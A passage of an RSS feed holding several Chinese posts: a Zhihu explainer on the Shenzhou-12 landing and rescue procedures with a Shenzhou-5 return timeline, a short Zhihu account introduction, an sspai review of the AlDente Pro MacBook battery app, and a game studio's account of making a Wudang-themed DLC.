，为指挥中心提供决策依据。<br><b>　搜救。</b>这是着陆场的主要任务，分正常和应急两种返回状态的搜救模式，应急又分为陆上着陆区和海上溅落区。飞船正常返回概率高，所以搜救力量集中布置在主、副着陆场，主着陆场力量配置要比副着陆场强，主要依靠直升机、地面车辆进行搜救。上升段的海上３个溅落区，主要靠交通运输部救捞局的３艘打捞船进行应急搜救。国内运行段的３个应急着陆区，主要依靠固定翼飞机、伞兵、着陆区附近的直升机、医院等进行联合营救。<br><b>　通信。</b>分天地通信和跨区通信两种。天地通信是指返回舱出“黑障”区之后，航天员与指挥部门和医监医保医生的通话。跨区通信是由于着陆场区站的搜救力量分布在不同地域，要使它们与北京飞控中心保持通信联系，以便于指令迅速传达到位。场区内部的通信，重点是在主、副着陆场，主要是组织协调联合各部分力量来完成搜救任务。<br><b>　气象保障。</b>一是主、副着陆场的气象保障，需提前给决策部门提供气象条件，以便尽早决定是采用主着陆场还是副着陆场；二是要提供一系列的预报天气测量数据，并传到北京飞控中心对数据进行分析，了解着陆场风的分布和运动状态，以便及时修正返回舱开伞点，确保返回舱落到理论落点。</p>\n<h2>\n<br>第四件事：如何快速找到返回舱</h2>\n<p><br>为保证地面航天员搜救系统及时搜索到返回地面的返回舱，除在飞船返回舱迹上布设一定数量的雷达，跟踪测量返回舱轨道并预报落点位置外，返回舱上还配有自主标示自身位置的示位标设备，告诉搜救人员“我在这里”。返回舱上的着陆标位设备以发送国际救援组织规定频率和格式的无线电设备为主，主要有超短波信标、超短波通信设备、国际搜索救援示位标等；为方便夜间寻找返回舱，在返回舱“肩部”位置装有闪光灯，直升机据此能在夜间发现3-5千米远的返回舱；当返回舱溅落在海上时，在波浪翻滚的大海里，直径小于3米的返回舱更难以发现，为引导飞机和救捞船搜索返回舱，在返回舱“底部”装有海水染色剂，当返回舱溅落水上时，海水染色剂会缓慢释放，将附近水面染成亮绿色，持续时间可达4小时。返回舱的主伞伞衣用对比度强烈的同心圆彩带做成，而彩条的颜色组合可以根据飞船返回季节的大地背景进行选择。利用这种与大地背景反差很大的降落伞，可以增大返回舱的空中发现距离。</p>\n<h2>\n<br>第五件事：这次返回着陆前的特殊程序验证？</h2>\n<p><br>这次神舟十二号和核心舱分离后，按计划进行载人飞船绕飞和径向交会对接试验,注意，只是验证哟，不是真正的径向对接哟。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7be471fe6cd24c9cc160ed73aa7ce44d_720w.jpg?rss\" data-rawwidth=\"1344\" data-rawheight=\"924\" data-size=\"normal\" data-caption=\"示意图（径向对接）\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2>第六件事：过程中哪个时刻是最艰苦的时刻？</h2>\n<p><br>这个问题，航天员刘旺曾经作为解说嘉宾，在神舟九号的返回过程中说过，有三个过程会是比较艰苦的，<br><b>第一个，美丽的艰苦</b>，在返回再入的黑障区时，边着陆边欣赏舷窗外的火光四射！</p>\n<a href=\"https://www.zhihu.com/zvideo/1416323025231339520\">【浴火重生·航天】飞船返回再入大气层的视频</a><p><b>第二个，激烈冲击的艰苦，</b>开伞时刻，需要提前做好例如腹式呼吸，紧贴座椅缓冲垫等对抗动作！<br><b>第三个，激动的艰苦，</b>即：反推点火着陆后，手动切伞后，如果是悬吊位，将会很难受。</p>\n<h2>\n<br>第七件事：如果飞船一旦着陆海上如何搜救？</h2>\n<p><br>目前这种情况是小概率事件，但是应急返回一直在准备。<br>如果在海上着陆了，目前，根据前几次的飞行实际情况，主要依靠交通运输部救捞局来完成。飞船发射前，各救捞船打开船载超短波定向仪在指定海域待命，当返回舱应急溅落海上溅落区时，北京任务联合指挥所根据落点预报命令救捞船迅速赶往返回舱溅落点搜索返回舱，并及时更新返回舱位置信息，引导救捞船接近返回舱，将返回舱整舱打捞至船甲板并固定后，由医监医保人员根据航天员状态决定出舱方式，并协助航天员出舱。针对高、低海况，早在2002年就组织20多家单位进行了海上返回舱漂浮、航天员耐受力和搜索打捞综合试验，2018年还组织了有国际航天员参加的海上着陆返回救生训练。自主设计的拦截臂打捞网在高海况条件下，能够完成拦截、打捞、起吊、固定等工作，从而快速有效地救援航天员。<br>我国在国内外设立了若干个应急着陆区，每个着陆场区都有相应的应急搜救预案和搜救力量。在出现极端特殊情况时，飞船可能选择国外应急着陆，将依据国际航天救援合作有关规定，落点所在国有责任和义务并本着人道主义精神帮助我们搜索返回舱、救援航天员，与此同时，国内还派出境外应急搜救及后续处理工作组，负责实施境外的后续相关工作，确保航天员平安回家。</p>\n<h2>\n<br>附录：</h2>\n<h3>\n<br>1、神舟五号的返回时序表（实际时间）</h3>\n<p><br>10月16日5时35分，北京航天指挥控制中心成功向正在太空运行的神舟五号载人飞船发送返回指令。按照程序，飞船将在建立返回姿态后，经过返回制动、轨道舱与返回舱分离、推进舱与返回舱分离等一系列太空控制动作，开始返回内蒙古主着陆场。<br>10月16日5时36分神舟五号载人飞船轨道舱与返回舱成功分离。返回舱与推进舱轨道高度不断降低，向预定落点返回。飞船轨道舱将留轨工作半年，开展相关的科学实验。<br>10月16日5时38分神舟五号载人飞船制动火箭点火，飞船返回舱飞行速度减缓，轨道高度进一步降低。返回舱向预定着陆场降落。<br>10月16日5时56分，在北京航天指挥控制中心的组织指挥下，神舟五号载人飞船返回舱与推进舱成功分离，成功进入返回轨道。飞船返回舱失去动力后，按照升力控制技术向预定着陆场降落。<br>稍后，布设在新疆和田的活动测量站报告神舟五号载人飞船进入中国国境上空。<br>10月16日6时04分，神舟五号载人飞船再入大气层。目前飞船处于“黑障”阶段。<br>10月16日6时07分，搜救直升机收到神舟五号载人飞船返回舱发出的无线电信号，机上的搜索人员目视到神舟五号载人飞船返回舱。由5架直升机组成的空中搜救分队和14台专用车辆组成的地面搜救分队立即从不同的方向迅速向落点前进。<br>10月16日6时许，杨利伟报告身体状况良好。返回舱引导伞已打开。<br>稍后，杨利伟再次报告身体状况良好。主伞工作正常。<br>稍后，主着陆区直升机驾驶员目视到飞船降落伞，地面搜索人员看到了降落伞，返回舱主伞已脱落。五架直升机跟踪正常。<br>10月16日6时28分，地面搜索人员报告距神舟五号载人飞船返回舱落点7.5公里。<br>稍后，温家宝总理与杨利伟通话，祝贺他顺利返航。<br>10月16日6时36分，地面搜索人员找到了神舟五号载人飞船返回舱。<br>10月16日6时38分，搜索人员报告，杨利伟身体状况良好。<br>稍后，杨利伟向人群挥手，正在出舱。<br>10月16日6时51分，杨利伟在神舟五号载人飞船舱口向大家招手，神态自若。<br>10月16日6时54分，李继耐在北京航天指挥控制中心宣布：神舟五号载人飞船16日6时23分在内蒙古主着陆场成功着陆，实际着陆点与理论着陆点相差4.8公里。返回舱完好无损。我们的航天英雄杨利伟自主出舱。我国首次载人航天飞行圆满成功。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1473a1dd1898ff20bcabeff5e770a486_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"469\" data-size=\"normal\" data-caption=\"神舟十一号的着陆现场\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>\n<br><b>附录2 俄罗斯联盟号返回着陆舱内全程视频</b>\n</h3>\n<a href=\"https://www.zhihu.com/zvideo/1418867010553528320\">很艰难！【俄罗斯·联盟号载人飞船】再入返回时舱内画面</a><h2>\n<br>英雄即将凯旋，我们热烈期待！</h2>\n<p>（后续将追更，敬请期待）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wo-men-de-tai-kong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">我们的太空</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/486903558/answer/2121459177?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">45 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/486830250?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">神舟十二号 3 名航天员将于9 月17日返回地球，着陆点为何定在东风着陆场，有哪些考虑？</a><br><a href=\"http://www.zhihu.com/question/480997825?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">神舟十二号航天员即将第二次出舱，需要完成哪些任务？你有何期待与期望？</a><br>\n","link":"http://www.zhihu.com/question/486903558/answer/2121459177?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"因为你，我们来这问答，因为航天，我们入驻表达！","date":"2021-09-16 05:38:22","description":"\n<p>hi，大家好。我是中国航天事业和国防科技工业的中坚力量，航天强国建设和国防武器装备建设的主力军～中国航天科工知乎官方账号，也有很多网友叫我“航小科”，一个有点高冷还有点可爱的航天防务科普小能手。因为你，我们来这问答，因为航天，我们入驻表达！希望在这里，我们一起探知中国航天，分享航天趣事。我们在乎每一个问答和每一次表达，求！友！善！</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a8612e62d3b8ec81ff8d625be7c8ebe2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"993\" data-rawheight=\"1664\" class=\"origin_image zh-lightbox-thumb\" width=\"993\" data-original=\"https://pic3.zhimg.com/v2-a8612e62d3b8ec81ff8d625be7c8ebe2_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-hang-tian-ke-gong?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国航天科工</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/410907347?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"App+1 | 你的 MacBook 电池管家—— AlDente Pro 使用体验","date":"2021-09-16 03:26:03","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>前段时间我开始使用一款 MacBook 专用的电池管理软件 AlDente，AlDente 可以读写 MacBook 内置 SMC 芯片，即使你的 MacBook 一直连接电源线，AlDente 也会根据设定在电脑内部自动接通和切断电源，这样就可以在必要的时候接通或者断开电源，从而避免电池彻底耗尽，或者长期处于过充状态。</p>\n<p><strong>AlDente 最主要的功能就是调整电池充电阈值。</strong>在电池电量在达到指定值后，电脑会停止充电，转向电池供电，全过程无需手动插拔 MacBook 充电器。当我查看 AlDente 网站时，发现开发者还提供了付费的 Pro 版本。相比免费的版本，Pro 版本提供了更多的可定制项（下文分别使用 AlDente Free 和 AlDente Pro 区分两款软件）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/0943041a40d6a7a209a12a78dbcba10d.png\"><figcaption>AlDente Free</figcaption></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/843f0a8884ddf9608b6becee77fc9ee7.png\"><figcaption>AlDente Pro，介面与免费版略有不同</figcaption></figure><h2>特色功能</h2>\n<p>AlDente Free 只有「调整充电阈值」和「放电模式」两项功能，而 AlDente Pro 的功能<sup class=\"ss-footnote\" href=\"\" title=\"AlDente 仅提供英文界面，下文所述功能名称均为作者直译，仅供参考。\" footnote-id=\"1\">1</sup>更加丰富。另外 AlDente Pro 在 UI 设计方面相对 AlDente Free 也有所改进。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/c6c93ce9d895960c3970194696793a2f.png\"><figcaption>AlDente Pro 设置</figcaption></figure><h3>航行模式 Sailing Mode</h3>\n<p>当电池电量达到设定阈值时，电脑将转为电源供电，此时电量可能会因为突然运行高负载任务（功率尖峰）而出现细微变化（例如短时间内电量下降了 1% ）。当开启航行模式后， AlDente Pro 会忽略这类细微的耗电量，避免因 1% 的电量变化，频繁对电池进行充电。航行模式允许设定一个差值，电量降低的幅度如果在差值范围内，AlDente Pro 不会为电池充电。</p>\n<p>非常幸运的是，较新的产品会配备最新的电源管理模块，在外接电源的情况下，电脑通常不会因为功率尖峰导致电量下降。那些服役许久、元器件老化的电脑才可能会有这个问题。</p>\n<h3>过热保护 Heat Protection</h3>\n<p>众所周知，无论是电脑还是手机，过高的机身温度会给电池带来严重损害。当电池工作温度超过了设定值，AlDente Pro 将会停止为你的 MacBook 充电。</p>\n<h3>校准模式 Calibration Mode</h3>\n<p>MacBook 电池长期处于未充满状态时，可能会影响系统自身对电池参数的识别，因此你需要定期将电脑充电至 100%。当开启校准模式后，AlDente Pro 会自动执行一次完全充电至 100% 的过程。此外 AlDente Pro 会在未来的更新中提供定期自动校准的功能。</p>\n<h3>实时状态栏图标 Live Status Icons</h3>\n<p>通过状态栏图标，可以快速了解电脑当前充电情况。</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>图标</th>\n<th>状态</th>\n<th>供电端</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/3c71f4294de14869bcc61e41cd2da17e.png\"></figure></td>\n<td>已连接电源，正在充电</td>\n<td>电源🔌</td>\n</tr>\n<tr>\n<td><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/aca64673322360345c8d0ada903c434a.png\"></figure></td>\n<td>已连接电源，未在充电</td>\n<td>电源🔌</td>\n</tr>\n<tr>\n<td><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/1732474034ec5e193b4cb06cf9955e96.png\"></figure></td>\n<td>已连接电源，正在放电</td>\n<td>电池🔋</td>\n</tr>\n<tr>\n<td><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/4b63129dccb99c7cefcda6f00e96121c.png\"></figure></td>\n<td>未连接电源，正在放电</td>\n<td>电池🔋</td>\n</tr>\n</tbody>\n</table></figure><h3>Intel 模式</h3>\n<p>一些 Intel MacBook 用户习惯通过 Boot Camp 运行 Windows 系统。AlDente Pro 在开启 Intel 模式后，电池保护就可以在 Windows 系统中发挥作用。但是 AlDente Pro 在此模式下仅支持调整充电阈值，除此之外，过热保护、航行模式、放电模式等其他功能都无法在 Windows 系统中生效。</p>\n<h3>其他细节</h3>\n<ul>\n<li>当你需要携带电脑外出时，提前点击 AlDente Pro 状态栏菜单中的「Top Up」即可进行完全充电，尽可能保证 MacBook 在外的续航时间；</li>\n<li>通过右键点击 AlDente Pro 状态栏图标，可以快速切换充电/放电状态。</li>\n</ul>\n<h2>注意事项</h2>\n<ul><li>使用 AlDente Pro 时，建议关闭 macOS 系统「优化电池充电」功能，二者同时运行可能会存在冲突；</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/84576a4e21964899ffef26d3bc21e5b1.png\"><figcaption>关闭「优化电池充电」</figcaption></figure><ul>\n<li>AlDente Free 和 AlDente Pro 不能在系统中共存，切换之前要确保卸载当前已安装的版本；</li>\n<li>AlDente Free 和 AlDente Pro 目前仅提供英文界面。在和开发者进行邮件沟通时，开发者表示当前注意力主要放在开发新功能和修复 bug 上，短期内没有支持其他语言的计划。</li>\n</ul>\n<h2>总结</h2>\n<p>AlDente Free 的功能虽然简单，但可以有效避免电池过充，对于长期接电源的使用场景来说已经足够。除非你有更个性化的充电需求，或者对电池健康状态特别在意，可以考虑购买 AlDente Pro 获得更佳体验。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/10/716771662ffeb346a66f579923df7caf.png\"><figcaption>MacBook 电池健康信息</figcaption></figure><p>锂电池因其材料自身限制，必定会随着时间的推移而出现不可逆的损耗，对此也无需太纠结。无论是 macOS 内置的「优化电池充电」功能，还是使用 AlDente Pro 优化充电过程，只能减缓电池损耗的速度，无法做到零损耗。要想尽可能维护电池性能，使用正规合格的充电器和线缆、保持良好的充电习惯才是最重要的。</p>\n<h2>AlDente 售价</h2>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>版本</td>\n<td colspan=\"2\">价格</td>\n<td>下载链接</td>\n</tr>\n<tr>\n<td>AlDente Free</td>\n<td colspan=\"2\">免费</td>\n<td><a href=\"https://github.com/davidwernhart/AlDente\" target=\"_blank\">GitHub</a></td>\n</tr>\n<tr>\n<td>AlDente Pro</td>\n<td>按年订阅 $14</td>\n<td>永久授权 $29</td>\n<td><a href=\"https://apphousekitchen.com/pricing/\" target=\"_blank\">官网</a></td>\n</tr>\n</tbody></table></figure><p>AlDente 仅适配 macOS Big Sur，支持 Intel 和 Apple 芯片。具体支持的 MacBook 型号可查询<a href=\"https://apphousekitchen.com/faq/\" target=\"_blank\">官网</a>说明或者该项目 <a href=\"https://github.com/davidwernhart/AlDente\" target=\"_blank\">GitHub</a> 主页。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/68241"},{"title":"国产游戏《了不起的修仙模拟器》DLC「武当仙踪」已解锁，体验如何？","date":"2021-09-16 02:56:07","description":"\n<p></p>\n<p><img src=\"https://pic4.zhimg.com/v2-954bc8e833c0c2b3815c9f79a2d554a8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1307\" data-rawheight=\"738\" data-watermark=\"watermark\" data-original-src=\"v2-954bc8e833c0c2b3815c9f79a2d554a8\" data-watermark-src=\"v2-d3150ee2c9cc9a13650181bd218ac3de\" data-private-watermark-src=\"v2-fbfc30c8700a86b3eab77e9f5120aea7\"></p>\n<p>很高兴能和武当博物馆联名推出《武当仙踪》扩展包，感谢武当的信任。</p>\n<p>按照原计划，正式版后我们会停止大型的内容更新，所以《竹林深处》大概率会是唯一也是最后一个《了不起的修仙模拟器》的DLC，同时我们也发布了公告说会将力量转移到修仙2的开发中。当时我信誓旦旦的跟主策阿鬼说再做就是狗。</p>\n<p>汪汪汪。</p>\n<p>去年一月的时候，我们接到了来自武当山的邀请，说希望能有所合作，而且他们内部有我们的玩家，当时二话不说丢了张五百多小时游戏时间的截图过来。于是我找到阿鬼说要不咱挤点时间加个班再做个DLC？</p>\n<p>阿鬼本来是拒绝的，但是当我告诉他是以天下第一仙山武当山为题材时，他就问我机票订几号的。于是拉上美术我们三人就踏上了武当山之旅。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-970872aed584b2079c3ff709949ce442_720w.png?rss\" data-caption=\"制作组三人合影\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"2250\" data-watermark=\"watermark\" data-original-src=\"v2-970872aed584b2079c3ff709949ce442\" data-watermark-src=\"v2-3b95700e77afde6f96063faefdb3ef7a\" data-private-watermark-src=\"v2-c4b831a3d6e0fc9368d03ea3edab0cc3\"></p>\n<p>到达十堰后我们和武当山的同学开了个小会，主要就是表达了我们对道教圣地滔滔不绝的崇敬之情，也提出了些问题，比如他们对我们游戏是怎么看的，对于我们的玩家是怎么看的，对于我们玩家那些意料之外的骚操作怎么看？没想到他们都很支持，基本上一直在说“可以”“都可以”，这也让我们放下了心来。</p>\n<p>碰巧疫情刚过，而且武当山在前两天才结束免费开放，所以我们上山后发现游客非常少，这“包山”一样的体验让我们对这片清雅之地有了很多不一样的体会。加上在武当博物馆了解到了武当文化里那些更加深层次的知识，当下我们就决定：这DLC是一定要做的！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-aaf3e06bff062b659d300f461aaa2210_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"625\" data-rawheight=\"808\" data-watermark=\"watermark\" data-original-src=\"v2-aaf3e06bff062b659d300f461aaa2210\" data-watermark-src=\"v2-dff46c172888407102e4d8e7492d1a02\" data-private-watermark-src=\"v2-0b87ec1485827f92933f7bd6052d558f\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-455339bdf49db3344bafb52215e692f3_720w.png?rss\" data-caption=\"法宝\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-455339bdf49db3344bafb52215e692f3\" data-watermark-src=\"v2-c9f7f9bd65d336581f52d195ccd8c888\" data-private-watermark-src=\"v2-73dda92d1ecf1d67a4701c5b0fe04bcf\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-63daee13aa99faf0f99a73e8d2297be6_720w.png?rss\" data-caption=\"聚灵60\" data-size=\"normal\" data-rawwidth=\"913\" data-rawheight=\"782\" data-watermark=\"watermark\" data-original-src=\"v2-63daee13aa99faf0f99a73e8d2297be6\" data-watermark-src=\"v2-49c716171e978a445167eb3f53def172\" data-private-watermark-src=\"v2-f17b57b3a439bdd911b4caa4bfdfbd0e\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bce5184003890308bddfaa296a0dea42_720w.png?rss\" data-caption=\"拿去拿去\" data-size=\"normal\" data-rawwidth=\"1510\" data-rawheight=\"737\" data-watermark=\"watermark\" data-original-src=\"v2-bce5184003890308bddfaa296a0dea42\" data-watermark-src=\"v2-f3496c6866b116cb5085cbb7a4caf253\" data-private-watermark-src=\"v2-16f4da13810af6403c9763aa9acc1479\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-944c88a93d0ed015daf1f2ab1dd68851_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"533\" data-watermark=\"watermark\" data-original-src=\"v2-944c88a93d0ed015daf1f2ab1dd68851\" data-watermark-src=\"v2-b600daca7e1088472659e8f69c3b4fbf\" data-private-watermark-src=\"v2-4195325e646f791dfd6199ab2a1d3733\"></p>\n<p>回到重庆后我们对着一大堆照片和武当工作人员提供的大量资料陷入了沉思，由于武当山的文化元素极其的精彩和庞大，我们一时间不知道该从什么角度切入才最好，这也带来了不小的压力。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3bce443d3aa5882de50a44dac27362cc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"800\" data-watermark=\"watermark\" data-original-src=\"v2-3bce443d3aa5882de50a44dac27362cc\" data-watermark-src=\"v2-ccc8b102d53aed8d0faa066e51ad110a\" data-private-watermark-src=\"v2-0135468233055145204e476ce90b004a\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b09148b1c05b03c7ae13dc8b8863dfec_720w.png?rss\" data-caption=\"修仙是一个2D风格垂直视角的游戏，这些美轮美奂的建筑和风景在我们的游戏里非常难表达出他们该有的风采。\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-b09148b1c05b03c7ae13dc8b8863dfec\" data-watermark-src=\"v2-c21ec84f7ee1b269a7816bf401ddd93d\" data-private-watermark-src=\"v2-7f165125a01dd57b6a37d5cebf5d0411\"></p>\n<p>最后我们选择了一个适合我们的方向：精神内核。</p>\n<p>我们国家的精神内核有很多，不论是女娲造人夸父逐日的神话，还是道家天人合一，儒家仁义礼智的学理思辨，都深切的影响着生长在这片土地上的我们。在这些精神内核中，有一个概念可谓重要之极，那就是“<b>阴阳</b>”。</p>\n<p>什么是阴阳？作为普通人其实很少会刻意地思考这个概念。但这个概念所代表的哲学观无处不在：实为阳，虚为阴；山为阳，水为阴；面为阳，背为阴；进为阳，退为阴……上到盘古开天辟地，天清为阳，地浊为阴，世界因而诞生。下到我们说的阴阳怪气，字面的意思为阳，隐含的意思为阴，也是这么回事。</p>\n<p>但阴阳却也不止于二分对立，也包含有互相转化，动态平衡的概念。往小来看，我们常说福祸相依，此消彼长不外如是；往大说，领袖敌进我退，敌驻我扰，敌疲我打，敌退我追的十六字方针也隐含这样的理念。</p>\n<p>例如比较有代表性的复真观的九曲黄河墙，以及南岩宫的龙头香。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b53dd876ff2793547bc5f97425198eda_720w.png?rss\" data-caption=\"九曲黄河墙\" data-size=\"normal\" data-rawwidth=\"628\" data-rawheight=\"468\" data-watermark=\"watermark\" data-original-src=\"v2-b53dd876ff2793547bc5f97425198eda\" data-watermark-src=\"v2-8c8879427b3e7400585bcff5cb0b64bf\" data-private-watermark-src=\"v2-a187cfb89164fca78370d69c4b71b556\"></p>\n<p>九曲黄河墙严格来说是一段风水墙，其入口出口其实是在一条直线上，但通过弯曲的墙面结构，站在入口却看不到出口，只觉小巷蜿蜒绵长。俯视图如下：<br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-58b25bdbce303ef4827dba3596af2337_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"965\" data-rawheight=\"545\" data-watermark=\"watermark\" data-original-src=\"v2-58b25bdbce303ef4827dba3596af2337\" data-watermark-src=\"v2-6f227440f63bb41eb0d5c00be0edb092\" data-private-watermark-src=\"v2-002571878d53cdd3ec7f913a2d87fe80\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-22e22054ecf0d01ebecc94e4379a0359_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1106\" data-rawheight=\"909\" data-watermark=\"watermark\" data-original-src=\"v2-22e22054ecf0d01ebecc94e4379a0359\" data-watermark-src=\"v2-91e4b26c377f68a3f470cb2f32eb3697\" data-private-watermark-src=\"v2-da1fb8424bba3a19474b84e483246086\"></p>\n<p>这其实很有讲究，古代的建筑风水，其实很在意一个风水外泄的忌讳，比如宅院进门的照壁就是为此而设。但九曲黄河墙可谓别出机杼的解决了这个问题，沿山而上的弯曲墙壁化虚为实的营造出一段空间，却又同时实现了通而不泄的效果。自入口进入，觉前路幽深静谧，此为阴；自出口而出，回首而望，却感到豁然开朗，此为阳。行走过程阴阳自然转化，此中妙处，非亲临不能得。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-eb0c114af7a8f8d0cc0f2b9b5cf66604_720w.png?rss\" data-caption=\"龙头香\" data-size=\"normal\" data-rawwidth=\"559\" data-rawheight=\"436\" data-watermark=\"watermark\" data-original-src=\"v2-eb0c114af7a8f8d0cc0f2b9b5cf66604\" data-watermark-src=\"v2-067eb10bcad327aa1f08ea4cdd9cdfd1\" data-private-watermark-src=\"v2-aad071858a3de64d1c539d423ae5250b\"></p>\n<p>龙头香地处南岩宫，整个南岩宫是沿绝壁而凿建，龙头香便处于南岩宫绝壁中段。从侧面看龙头香还只觉造物精巧，但当站在龙头香之前正对而望时，一切便骤然升华。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8f56b4d64d07a8f7fbd76513c502bf59_720w.png?rss\" data-caption=\"如果你在游戏里点到头香，也会获得祝福\" data-size=\"normal\" data-rawwidth=\"632\" data-rawheight=\"382\" data-watermark=\"watermark\" data-original-src=\"v2-8f56b4d64d07a8f7fbd76513c502bf59\" data-watermark-src=\"v2-90b77dbf7df42e19d0c37690c2177b3b\" data-private-watermark-src=\"v2-daa38425b60cffca68a523e030f17c0b\"></p>\n<p>此刻整个视线中唯一的实物为孤悬天地间的精致清晰的香炉，背景则是笼罩在薄雾中朦胧隐约的武当山间绝景。一者极小，一者极大，一者清晰，一者朦胧，一者实，一者虚，但在视野中却分庭抗礼，平分秋色，强烈的冲击便扑面而来。</p>\n<p><br></p>\n<p>如果说九曲黄河墙让人觉得阴阳转换之精巧玄妙，而龙头香就是让人感受到阴阳相对的震撼了。</p>\n<p>再比如武当主打的修炼方法《玄天真武两仪妙道》的核心机制就是围绕这一概念而制作的。  </p>\n<p><img src=\"https://pic2.zhimg.com/v2-3f4044b90d5bdbd895d84ea92d5502f9_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"532\" data-rawheight=\"296\" data-watermark=\"watermark\" data-original-src=\"v2-3f4044b90d5bdbd895d84ea92d5502f9\" data-watermark-src=\"v2-422214575f843cf837e3456e1dc0c8fe\" data-private-watermark-src=\"v2-e16c652e5ee7aeea93844862eefb6689\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5006065b5e4ae391274fac4cf7d4c135_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"274\" data-watermark=\"watermark\" data-original-src=\"v2-5006065b5e4ae391274fac4cf7d4c135\" data-watermark-src=\"v2-4b4560c46e2ffe3a3ed891fb2508363c\" 